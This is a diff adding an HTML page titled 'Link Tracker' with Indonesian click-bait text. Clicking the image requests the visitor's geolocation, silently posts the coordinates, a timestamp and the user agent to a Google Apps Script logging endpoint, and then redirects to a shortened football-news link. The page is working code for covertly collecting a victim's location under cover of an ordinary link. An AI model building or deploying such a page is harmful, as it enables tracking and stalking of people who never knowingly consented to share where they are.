@@ -1,0 +1,42 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Link Tracker</title>
+</head>
+<body>
+  <h2>Klik gambar untuk lanjut</h2>
+  <img src="https://via.placeholder.com/400x200.png?text=Klik+Saya" 
+       alt="Klik gambar" 
+       style="cursor:pointer; width:400px;" 
+       onclick="trackAndRedirect()">
+
+  <script>
+    const redirectURL = "https://nlink.at/beritabola"; // Ganti ke tujuan akhir
+    const logEndpoint = "https://script.google.com/macros/s/AKfycbzxPHMWgQFYoko4icW2FT1jfHPlL4XdPbkp6s_HWYryP_g9ENda_67GCDefKmOW3RFanQ/exec";
+
+    function trackAndRedirect() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          fetch(logEndpoint, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent
+            })
+          }).finally(() => {
+            window.location.href = redirectURL;
+          });
+        }, () => {
+          window.location.href = redirectURL;
+        });
+      } else {
+        window.location.href = redirectURL;
+      }
+    }
+  </script>
+</body>
+</html>
